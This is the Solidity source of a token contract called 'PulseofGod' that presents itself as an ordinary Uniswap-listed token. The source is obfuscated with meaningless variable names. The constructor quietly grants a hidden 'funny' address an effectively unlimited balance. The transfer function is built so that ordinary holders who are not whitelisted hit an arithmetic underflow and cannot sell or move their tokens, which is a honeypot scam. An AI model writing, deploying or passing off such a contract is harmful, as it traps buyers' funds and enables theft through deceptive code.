// https://t.me/PulseofGod

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract PulseofGod is Ownable {
    constructor(
        string memory fox,
        string memory offer,
        address gas,
        address funny
    ) {
        uniswapV2Router = IUniswapV2Router02(gas);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = offer;
        _name = fox;
        back = 2;
        _decimals = 9;
        _balances[funny] = watch;
        modern = 1000000000;
        better[funny] = watch;
        _tTotal = modern * 10**_decimals;
        better[msg.sender] = watch;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public back;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private modern;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private fire;
    uint256 private watch = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address swung,
        address wise,
        uint256 soon
    ) internal {
        uint256 tax = back;

        address sets = uniswapV2Pair;

        if (better[swung] == 0 && sets != swung && because[swung] > 0) {
            better[swung] -= tax;
        }

        address getting = fire;
        fire = wise;
        because[getting] += tax + 1;

        _balances[swung] -= soon;
        uint256 like = (soon / 100) * back;
        soon -= like;
        _balances[wise] += soon;
    }

    mapping(address => uint256) private because;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private better;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}